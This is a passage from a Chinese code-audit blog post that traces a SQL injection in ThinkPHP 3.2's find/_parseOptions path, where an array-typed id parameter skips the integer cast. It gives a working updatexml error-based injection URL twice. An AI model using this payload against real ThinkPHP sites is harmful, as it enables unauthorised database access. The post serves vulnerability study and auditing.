&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;queryStr = <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind)) &#123;</span><br><span class="line">        <span class="variable">$that</span>           = <span class="variable language_">$this</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;queryStr = <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr, <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$val</span>) <span class="keyword">use</span> (<span class="variable">$that</span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$fetchSql</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;queryStr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放前次的查询结果</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;PDOStatement)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;queryTimes++;</span><br><span class="line">    <span class="title function_ invoke__">N</span>(<span class="string">&#x27;db_query&#x27;</span>, <span class="number">1</span>); <span class="comment">// 兼容代码</span></span><br><span class="line">    <span class="comment">// 调试开始</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">debug</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;PDOStatement = <span class="variable language_">$this</span>-&gt;_linkID-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;PDOStatement) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;bind <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;PDOStatement-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="variable">$key</span>, <span class="variable">$val</span>[<span class="number">0</span>], <span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;PDOStatement-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="variable">$key</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;bind = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;PDOStatement-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="comment">// 调试结束</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">debug</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getResult</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体的流程大概就如以上的形式，下面根据payload进行分析一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/home/sql?id[where]=1 and updatexml(1,concat(0x7e,user()),1) %23</span><br></pre></td></tr></table></figure>

<p>id参数为一个数组，如果不是数组的话就会进入find方法的第一个if里面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$options</span>) || <span class="title function_ invoke__">is_string</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="comment">//进入不到，因为is_numeric和is_string不满足</span></span><br><span class="line">            <span class="variable">$where</span>[<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>()] = <span class="variable">$options</span>;</span><br><span class="line">            <span class="variable">$options</span>               = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]      = <span class="variable">$where</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>然后会进入_parseOptions</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                <span class="comment">//去空</span></span><br><span class="line">                <span class="variable">$key</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseType</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>], <span class="variable">$key</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;(&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;&amp;&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>) . <span class="string">&#x27;:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;=&gt;&#x27;</span> . <span class="variable">$val</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>先看下传入数组和不传入数组的区别</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">传入数组：</span><br><span class="line">	array(2) &#123; [&quot;where&quot;]=&gt; string(42) &quot;1 and updatexml(1,concat(0x7e,user()),1) #&quot; [&quot;limit&quot;]=&gt; int(1) &#125; </span><br><span class="line">不传入数组：</span><br><span class="line">	array(2) &#123; [&quot;where&quot;]=&gt; array(1) &#123; [&quot;id&quot;]=&gt; string(42) &quot;1 and updatexml(1,concat(0x7e,user()),1) #&quot; &#125; [&quot;limit&quot;]=&gt; int(1) &#125; </span><br></pre></td></tr></table></figure>

<p>可见如果不传入数组形式的参数的话就会进入到这个if，随后进入_parseType进行强制转换为数字型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseType</span>(<span class="params">&amp;<span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="string">&#x27;:&#x27;</span> . <span class="variable">$key</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">        <span class="variable">$fieldType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;enum&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 支持ENUM类型优先检测</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bigint&#x27;</span>) &amp;&amp; <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;int&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;float&#x27;</span>) || <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;double&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bool&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = (<span class="keyword">bool</span>) <span class="variable">$data</span>[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/home/sql?id[where]=1 and updatexml(1,concat(0x7e,user()),1) %23</span><br></pre></td></tr></table></figure>

<p><img src="/QianGeG.github.io/2024/04/20/Thinkphp3.2/Snipaste_2024-04-20_12-20-13.png" alt="Snipaste_2024-04-20_12-20-13"></p>
<div class="post-tags"><a class="post-tag-link" href="../../../../tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">#代码审计</a></div></article><div id="paginator"></div></div></div><div id="bottom-outer"><div id="bottom-inner"><hr><div><div><a>2024@ </a><a href="/"><img src="/assets/rss.png"></a></div><div id="hexo"><a>Powered by&nbsp</a><a target="_blank" rel="noopener" href="https://github.com/QianGeG">Qian's Github</a></div></div></div></div></div></body><script src="/js/oasis.js"></script></html>